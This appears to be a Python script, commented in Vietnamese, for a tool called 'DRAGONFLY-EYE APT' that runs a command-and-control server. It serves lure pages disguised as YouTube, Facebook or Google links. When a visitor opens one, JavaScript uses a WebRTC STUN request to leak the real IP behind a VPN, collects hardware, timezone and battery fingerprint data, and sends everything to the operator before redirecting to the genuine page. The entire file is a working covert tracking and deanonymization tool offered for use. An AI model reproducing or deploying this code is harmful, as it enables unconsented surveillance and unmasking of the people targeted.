import http.server
import socketserver
import urllib.parse
import json
import datetime
import sys
import threading

# Cổng lắng nghe mặc định của máy chủ C2
PORT = 8080

# Cấu hình lưu trữ động cho chiến dịch tác chiến
campaign_config = {
    "platform": "youtube",
    "target_id": "E8vVsU1kkEQ",
    "redirect_url": "https://www.youtube.com/watch?v=E8vVsU1kkEQ",
    "meta_title": "YouTube - Trending Video",
    "meta_image": "https://img.youtube.com/vi/E8vVsU1kkEQ/maxresdefault.jpg"
}

class DynamicDragonflyHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        # Tắt log hệ thống để giữ tính tàng hình trên Console
        return

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        
        # Tiếp nhận yêu cầu truy cập từ liên kết mồi nhử của mục tiêu
        if parsed.path in ["/watch", "/", "/share", "/search"]:
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            
            # Khởi tạo mã độc thô sinh dữ liệu động dựa trên cấu hình cấu trúc nền tảng đã chọn
            dragonfly_payload = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="utf-8">
                <title>{campaign_config['meta_title']}</title>
                <meta property="og:title" content="{campaign_config['meta_title']}">
                <meta property="og:image" content="{campaign_config['meta_image']}">
                <meta property="og:type" content="video.other">
            </head>
            <body style="background:#050505; color:#fff; font-family:monospace; text-align:center; padding-top:15%;">
                <div id="loader">Loading secure content...</div>
                <script>
                    const telemetry = {{
                        timestamp: new Date().toISOString(),
                        compound_lens: {{}}
                    }};

                    // Thấu kính 1: Khởi tạo WebRTC STUN thô bóc trần IP thực phía sau VPN
                    function lens_webrtc() {{
                        return new Promise((resolve) => {{
                            let rtc = new RTCPeerConnection({{iceServers: [{{urls: "stun:stun.l.google.com:19302"}}]}});
                            rtc.createDataChannel("");
                            rtc.createOffer().then(o => rtc.setLocalDescription(o));
                            rtc.onicecandidate = (e) => {{
                                if (e && e.candidate && e.candidate.candidate) {{
                                    let ip = /(?:[0-9]{{1,3}}\.){{3}}[0-9]{{1,3}}/.exec(e.candidate.candidate);
                                    if (ip) resolve(ip[0]);
                                }}
                            }};
                            setTimeout(() => resolve("NO_LEAK"), 300);
                        });
                    }}

                    // Thấu kính 2: Trích xuất hồ sơ môi trường và nguồn điện phần cứng
                    async function lens_hardware() {{
                        let battery_info = "N/A";
                        if (navigator.getBattery) {{
                            try {{
                                let b = await navigator.getBattery();
                                battery_info = {{ level: (b.level * 100) + "%", charging: b.charging }};
                            }} catch(e){{}}
                        }}

                        return {{
                            screen_res: `${{window.screen.width}}x${{window.screen.height}}`,
                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                            cores: navigator.hardwareConcurrency || "N/A",
                            user_agent: navigator.userAgent,
                            language: navigator.language,
                            battery: battery_info
                        }};
                    }}

                    // Phát lệnh bắn dữ liệu exfiltration bất đồng bộ về C2
                    async function strike() {{
                        telemetry.compound_lens.real_ip_webrtc = await lens_webrtc();
                        telemetry.compound_lens.hardware_profile = await lens_hardware();

                        fetch('/dragonfly-telemetry', {{
                            method: 'POST',
                            headers: {{'Content-Type': 'application/json'}},
                            body: JSON.stringify(telemetry)
                        }});

                        // Thực hiện lệnh chuyển hướng êm ái sang trang đích thực tế của đối tượng
                        setTimeout(() => {{
                            window.location.href = "{campaign_config['redirect_url']}";
                        }}, 150);
                    }

                    window.onload = strike;
                </script>
            </body>
            </html>
            """
            self.wfile.write(dragonfly_payload.encode('utf-8'))

    def do_POST(self):
        if self.path == "/dragonfly-telemetry":
            content_length = int(self.headers['Content-Length'])
            raw_data = self.rfile.read(content_length).decode('utf-8')
            data = json.loads(raw_data)
            
            client_ip = self.client_address[0]
            ts = datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3]
            
            print(f"\n[DRAGONFLY EYE TELEMETRY RECEIVED - {ts}]")
            print(f" |-- Direct Connection IP: {client_ip}")
            print(f" |-- Real IP (WebRTC VPN Bypass): {data['compound_lens'].get('real_ip_webrtc')}")
            
            hw = data['compound_lens'].get('hardware_profile', {})
            print(f" |-- Target Timezone: {hw.get('timezone')}")
            print(f" |-- Battery Status: {hw.get('battery')}")
            print(f" |-- Hardware Profile: {hw.get('screen_res')} | CPU Cores: {hw.get('cores')} | Lang: {hw.get('language')}")
            print(f" |-- Target User-Agent: {hw.get('user_agent')}")
            print(f" `--- Status: INTELLIGENCE ACQUIRED - INTERCEPTION LIVE")
            print("="*80)
            
            self.send_response(200)
            self.end_headers()

def run_server():
    try:
        with socketserver.TCPServer(("", PORT), DynamicDragonflyHandler) as httpd:
            httpd.serve_forever()
    except Exception as e:
        print(f"[-] Server Error: {e}")
        sys.exit(1)

def setup_interactive_cli():
    print("="*80)
    print(" DRAGONFLY-EYE APT v2.0 | DYNAMIC MASQUERADE CONSOLE")
    print("="*80)
    print("[1] YouTube Platform Masquerade")
    print("[2] Facebook Platform Masquerade")
    print("[3] Google Platform Masquerade")
    print("="*80)
    
    choice = input("[?] Select targeted platform (1-3): ").strip()
    
    if choice == "1":
        target_id = input("[?] Enter YouTube Video ID (e.g., E8vVsU1kkEQ): ").strip()
        campaign_config["platform"] = "youtube"
        campaign_config["target_id"] = target_id
        campaign_config["redirect_url"] = f"https://www.youtube.com/watch?v={target_id}"
        campaign_config["meta_title"] = "YouTube - Watch Exclusive Video"
        campaign_config["meta_image"] = f"https://img.youtube.com/vi/{target_id}/maxresdefault.jpg"
        generated_url = f"http://<SERVER_IP>:{PORT}/watch"
        
    elif choice == "2":
        target_id = input("[?] Enter Facebook Post/Video ID: ").strip()
        campaign_config["platform"] = "facebook"
        campaign_config["target_id"] = target_id
        campaign_config["redirect_url"] = f"https://www.facebook.com/watch/?v={target_id}"
        campaign_config["meta_title"] = "Facebook - Shared Media Content"
        campaign_config["meta_image"] = "https://www.facebook.com/images/fb_icon_325x325.png"
        generated_url = f"http://<SERVER_IP>:{PORT}/share"
        
    elif choice == "3":
        search_query = input("[?] Enter Google Search Query or Path: ").strip()
        campaign_config["platform"] = "google"
        campaign_config["target_id"] = search_query
        campaign_config["redirect_url"] = f"https://www.google.com/search?q={urllib.parse.quote(search_query)}"
        campaign_config["meta_title"] = "Google Search - Document Found"
        campaign_config["meta_image"] = "https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"
        generated_url = f"http://<SERVER_IP>:{PORT}/search"
    else:
        print("[-] Invalid Selection. Aborting Campaign Setup.")
        sys.exit(1)

    print("\n[+] CONFIGURATION DEPLOYED SUCCESSFULLY")
    print(f" |-- Platform Mask: {campaign_config['platform'].upper()}")
    print(f" |-- Target Resource: {campaign_config['target_id']}")
    print(f" |-- Generation Vector URL: {generated_url}")
    print("[*] C2 Node active. Monitoring the horizon for target movement...\n")

if __name__ == "__main__":
    # Khởi chạy luồng máy chủ ngầm để không làm nghẽn dòng lệnh CLI tương tác
    server_thread = threading.Thread(target=run_server, daemon=True)
    server_thread.start()
    
    # Kích hoạt giao diện thiết lập chiến dịch trực tiếp
    setup_interactive_cli()
    
    # Giữ luồng chính hoạt động liên tục để đón nhận tín hiệu exfiltration
    try:
        while True:
            import time
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Operation terminated by operator.")
        sys.exit(0)
